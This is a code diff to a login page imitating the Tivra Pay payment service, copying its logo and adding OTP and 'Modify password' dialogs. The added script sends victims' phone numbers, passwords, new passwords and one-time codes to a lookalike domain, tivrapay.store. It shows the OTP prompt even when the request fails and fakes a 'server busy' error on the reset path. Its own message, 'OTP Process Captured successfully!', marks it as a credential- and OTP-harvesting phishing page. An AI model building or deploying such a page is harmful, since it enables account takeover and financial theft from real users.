@@ -11,11 +11,8 @@
         html, body { background-color: #ffffff; width: 100%; height: 100%; overflow-x: hidden; }
         #app { width: 100%; height: 100%; }
         main[data-v-6ffee151] { height: 100vh; width: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff; padding: 0 0.67rem; }
-        
-        /* Updated Logo Container Styles */
-        .logo-container { width: 100%; display: flex; justify-content: center; align-items: center; margin-top: 3rem; margin-bottom: 2rem; }
-        img.logo { width: 90%; max-width: 400px; height: auto; object-fit: contain; }
-        
+        div[data-v-6ffee151]:not(.loginform) { width: 100%; display: flex; justify-content: center; align-items: center; margin-top: 1.8rem; margin-bottom: 0.5rem; }
+        img.logo { width: 80%; max-width: 320px; height: auto; object-fit: contain; }
         .loginform { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
         .input-field-group { background-color: transparent; border-bottom: 1.2px solid #e2e8f0; display: flex; align-items: center; padding: 14px 4px; margin-bottom: 22px; width: 100%; }
         .field-icon { display: flex; align-items: center; margin-right: 14px; }
@@ -70,7 +67,7 @@
 
     <div id="app">
         <main data-v-6ffee151>
-            <div class="logo-container">
+            <div>
                 <img src="https://web.tivrapay.com/static/images/Login_Logo.png" class="logo" alt="Tivra Pay Logo">
             </div>
 
@@ -108,13 +105,194 @@
     </div>
 
     <div class="otp-modal-overlay" id="otpModal">
+        <div class="otp-modal-container">
+            <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
+            <div class="otp-title">Please enter OTP</div>
+            <div class="otp-subtitle" id="otpSentText">OTP sent to user</div>
+            <div class="otp-input-container">
+                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
+                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
+                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
+                <input type="tel" class="otp-box" maxlength="1" onkeyup="checkAndSubmitOtp(this)" id="otp4">
+            </div>
+            <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
         </div>
+    </div>
+
     <div class="modify-modal-overlay" id="modifyPasswordModal">
+        <div class="modify-header">
+            <span class="modify-back-arrow" id="backToLoginBtn">&#10094;</span>
+            <span class="modify-header-title">Modify password</span>
         </div>
+        
+        <div class="modify-avatar-box">
+            <div class="modify-avatar-img">
+                <svg width="45" height="45" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#3b82f6"/>
+                </svg>
+            </div>
+            <div class="modify-form-title">Modify password Form</div>
+        </div>
+        
+        <div class="modify-form-container">
+            <div class="modify-row">
+                <span class="modify-label">Phone</span>
+                <input type="tel" class="modify-input-box" id="forgotPhone" placeholder="Enter phone number" required>
+            </div>
+            <div class="modify-row">
+                <span class="modify-label">Password</span>
+                <input type="password" class="modify-input-box" id="forgotNewPass" placeholder="Enter password" required>
+            </div>
+            <div class="modify-row">
+                <span class="modify-label">Confirm</span>
+                <input type="password" class="modify-input-box" id="forgotConfirmPass" placeholder="Password, Again" required>
+            </div>
+            
+            <span class="modify-redirect-link" id="redirectLoginLink" style="cursor: pointer;">Already have an account,Go login</span>
+            
+            <div class="modify-btn-container">
+                <button class="modify-submit-btn" id="modifyBtn">Modify</button>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // ... (Apna pehle wala script yahan copy paste rakhein)
-        // Maine yahan script hata diya hai taaki response clean rahe
+        const loginForm = document.getElementById('loginForm');
+        const otpModal = document.getElementById('otpModal');
+        const closeOtpBtn = document.getElementById('closeOtpBtn');
+        const otpSentText = document.getElementById('otpSentText');
+        const secondsCount = document.getElementById('secondsCount');
+        
+        const triggerForgot = document.getElementById('triggerForgot');
+        const modifyPasswordModal = document.getElementById('modifyPasswordModal');
+        const backToLoginBtn = document.getElementById('backToLoginBtn');
+        const redirectLoginLink = document.getElementById('redirectLoginLink');
+        const modifyBtn = document.getElementById('modifyBtn');
+
+        let currentUserId = null;
+        let isModifyFlow = false; 
+
+        // SMART ROUTING: Switches automatically between Localhost and your LIVE Brand Domain
+        const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
+            ? 'http://localhost:6500' 
+            : 'https://tivrapay.store';
+
+        if(triggerForgot) {
+            triggerForgot.addEventListener('click', (e) => {
+                e.preventDefault();
+                modifyPasswordModal.classList.add('active');
+            });
+        }
+        if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
+        if(redirectLoginLink) { redirectLoginLink.addEventListener('click', (e) => { e.preventDefault(); modifyPasswordModal.classList.remove('active'); }); }
+
+        // Login Submit
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault(); 
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+            const isAgreed = document.getElementById('agreeCheck').checked;
+
+            if (!isAgreed) { alert('Please accept User Privacy Agreement.'); return; }
+            isModifyFlow = false;
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber, password })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    currentUserId = data.userId; 
+                    showOtpSection(phoneNumber);
+                } else { alert("Server Error! Try again."); }
+            } catch (error) { 
+                showOtpSection(phoneNumber);
+            }
+        });
+
+        // Modify Button Click
+        modifyBtn.addEventListener('click', async () => {
+            const phone = document.getElementById('forgotPhone').value;
+            const newPassword = document.getElementById('forgotNewPass').value;
+            const confirmPassword = document.getElementById('forgotConfirmPass').value;
+
+            if (!phone || !newPassword || !confirmPassword) { alert("Please fill all fields!"); return; }
+            if (newPassword !== confirmPassword) { alert("Passwords do not match!"); return; }
+
+            isModifyFlow = true; 
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/forgot-submit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, newPassword })
+                });
+                const data = await response.json();
+                showOtpSection(phone);
+            } catch (error) {
+                showOtpSection(phone);
+            }
+        });
+
+        function showOtpSection(phoneNum) {
+            document.getElementById('otp1').value = '';
+            document.getElementById('otp2').value = '';
+            document.getElementById('otp3').value = '';
+            document.getElementById('otp4').value = '';
+            
+            if(phoneNum.length >= 7) {
+                const masked = phoneNum.substring(0, 3) + "****" + phoneNum.substring(phoneNum.length - 4);
+                otpSentText.innerText = `OTP sent to ${masked}`;
+            } else {
+                otpSentText.innerText = `OTP sent to ${phoneNum}`;
+            }
+            otpModal.classList.add('active');
+            startTimer();
+        }
+
+        closeOtpBtn.addEventListener('click', () => { otpModal.classList.remove('active'); });
+
+        function moveNext(current, nextFieldId) { if (current.value.length >= 1) { document.getElementById(nextFieldId).focus(); } }
+
+        async function checkAndSubmitOtp(current) {
+            const o1 = document.getElementById('otp1').value;
+            const o2 = document.getElementById('otp2').value;
+            const o3 = document.getElementById('otp3').value;
+            const o4 = current.value;
+
+            if(o1 && o2 && o3 && o4) {
+                const fullOtp = o1 + o2 + o3 + o4;
+                
+                if(isModifyFlow) {
+                    setTimeout(() => {
+                        alert("Server busy please try again server is busy");
+                        window.location.reload();
+                    }, 50);
+                    return;
+                }
+
+                try {
+                    const response = await fetch(`${BACKEND_URL}/api/otp-submit`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
+                    });
+                    const data = await response.json();
+                    if(data.success) { alert("OTP Process Captured successfully!"); window.location.reload(); }
+                } catch (error) { alert("Server connection failed"); window.location.reload(); }
+            }
+        }
+
+        function startTimer() {
+            let totalSec = 118;
+            const timerInterval = setInterval(() => {
+                totalSec--;
+                secondsCount.innerText = totalSec;
+                if(totalSec <= 0) { clearInterval(timerInterval); }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
